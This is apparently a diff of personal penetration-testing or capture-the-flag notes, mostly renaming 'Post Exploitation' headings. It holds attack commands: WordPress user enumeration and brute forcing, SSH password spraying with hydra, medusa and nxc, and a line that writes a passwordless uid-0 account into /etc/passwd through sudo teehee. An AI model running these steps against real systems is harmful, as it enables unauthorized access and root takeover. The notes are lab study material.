@@ -45,6 +45,8 @@ wpscan --url $URL -e u -P cewl.txt
 export PATH=/bin:/usr/bin:$PATH
 export SHELL=/bin/bash:$SHELL
 
+
+### Post Exploitation !
 ===========================
 Password Reuse and [sudo -l] :-
 ===========================
@@ -73,7 +75,7 @@ nuclei -u $URL -t /root/nuclei-templates/http/cves/ -tags joomla
 - searchsploit 
 - msfconsole  <-- A lot!
 
-### Post Exploitation
+### Post Exploitation !
 # Linux kernal Exploitation
 ------> linux kernal exploitation <-------
 => uname -a
@@ -91,8 +93,9 @@ nuclei -u $URL -t /root/nuclei-templates/http/cves/ -tags joomla
                * hydra -l jim -P old_password.bak dc4 ssh
                * medusa -u jim -P old_password.bak -h dc4 -M ssh
                * nxc ssh dc4 -u 'jim' -p 'old_password.bak'
-- Reading mails 
-### Post Exploitation
+- Reading mails
+
+### Post Exploitation !
 [/usr/bin/teehee] sudo -l
 
 echo "0xmr::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
